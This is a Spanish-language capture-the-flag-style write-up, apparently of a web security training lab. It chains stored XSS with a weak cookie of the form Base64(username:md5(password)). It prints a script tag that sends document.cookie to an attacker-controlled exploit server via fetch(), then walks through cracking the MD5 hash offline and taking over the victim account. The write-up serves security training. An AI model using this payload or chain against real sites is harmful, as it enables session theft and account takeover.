# 🔓 Cracking offline de contraseñas

## 📄 Descripción del laboratorio

Este laboratorio combina **autenticación rota** con **XSS almacenado**, permitiendo robar la cookie persistente de un usuario y crackear su contraseña offline.

Una vez obtenida la contraseña real de `carlos`, podemos iniciar sesión y eliminar su cuenta desde **My account**.

🎯 **Objetivo del laboratorio:**

* Robar la cookie persistente de `carlos`
* Extraer y crackear offline el hash de su contraseña
* Iniciar sesión como `carlos`
* Eliminar su cuenta

**Credenciales:**

```
Usuario propio: wiener:peter
Usuario víctima: carlos
```



## 📚 Teoría

La aplicación utiliza una cookie persistente con el formato:

```
Base64(username:md5(password))
```

Ejemplo:

```
carlos:5f4dcc3b5aa765d61d8327deb882cf99
```

Este diseño introduce varios problemas graves:

* **MD5 es determinista** (misma contraseña → mismo hash)
* No existe **salt**
* El formato de la cookie es **predecible**
* El hash puede romperse **offline**

El problema es que no tenemos la cookie de `carlos`.

El laboratorio también contiene un **XSS almacenado en los comentarios**, lo que permite robar la cookie de otros usuarios.

Flujo del ataque:

1. Inyectar **JavaScript malicioso** en un comentario
2. `carlos` visita la página
3. El script roba `document.cookie`
4. Enviamos la cookie a nuestro **Exploit Server**
5. Decodificamos el valor Base64
6. Extraemos el **hash MD5**
7. Crackeamos la contraseña offline
8. Iniciamos sesión como `carlos`



## 📝 Práctica

### 1️⃣ Confirmar el formato de la cookie

Iniciamos sesión con:

```
wiener : peter
```

Accedemos a `/my-account` y revisamos las cookies.

Encontramos:

```
stay-logged-in=...
```

![](../images/aut50.png)<br>
La decodificamos con **Burp Decoder** y obtenemos:

```
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

![](../images/aut51.png)<br>
Comprobamos el hash:

```bash
echo -n "peter" | md5sum
```

El valor coincide.

Queda confirmado que la cookie tiene el formato:

```
username:md5(password)
```

codificado en Base64.



### 2️⃣ Intento de ataque online

Intentamos el mismo ataque del laboratorio anterior usando **Burp Intruder**.

Configuración:

* Payload processing: `MD5 → prefix carlos: → Base64`
* Lista de contraseñas candidatas

Resultado:

No se obtiene ninguna respuesta válida.

Esto indica que la contraseña de `carlos` **no está en la lista**, por lo que el ataque online no funciona.



### 3️⃣ Confirmar el XSS almacenado

Vamos a la sección de **comentarios del blog**.

Probamos el payload:

```javascript
<script>alert(1)</script>
```

Refrescamos la página.

El alert se ejecuta, confirmando que existe **XSS almacenado**.



### 4️⃣ Robar la cookie con XSS

Usamos el **Exploit Server** proporcionado por el laboratorio.

Payload utilizado:

```javascript
<script>
fetch("https://exploit-xxxxxxxx.exploit-server.net/exploit?cookie=" + btoa(document.cookie));
</script>
```

Este script:

* Obtiene `document.cookie`
* Lo codifica en Base64 con `btoa`
* Envía el valor al servidor controlado por nosotros

Publicamos el comentario.

![](../images/aut52.png)<br>


### 5️⃣ Captura de la cookie

Después de que `carlos` visite el comentario, aparece una petición en el **Access log** del Exploit Server.

Ejemplo:

```http
GET /exploit?cookie=Y2FybG9zOjEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNA==
```

Copiamos el valor después de `cookie=` y lo decodificamos.

Esto revela:

```
carlos:<hash_md5>
```

![](../images/aut53.png)<br>
![](../images/aut54.png)


### 6️⃣ Cracking offline del hash

Utilizamos herramientas de cracking como:

* Crackstation
* Hashcat
* John the Ripper

Introducimos el hash MD5 y obtenemos la contraseña real.

![](../images/aut55.png)


### 7️⃣ Acceso y eliminación de la cuenta

Iniciamos sesión con:

```
usuario: carlos
contraseña: <contraseña_descubierta>
```

Accedemos a:

```
/my-account
```

Seleccionamos **Delete my account** y confirmamos.

![](../images/aut56.png)


### 8️⃣ Resultado

Se consigue:

* Robar la cookie de `carlos` mediante **XSS**
* Extraer el **hash MD5**
* Crackear la contraseña offline
* Iniciar sesión como `carlos`
* Eliminar su cuenta

✅ **Laboratorio resuelto.**
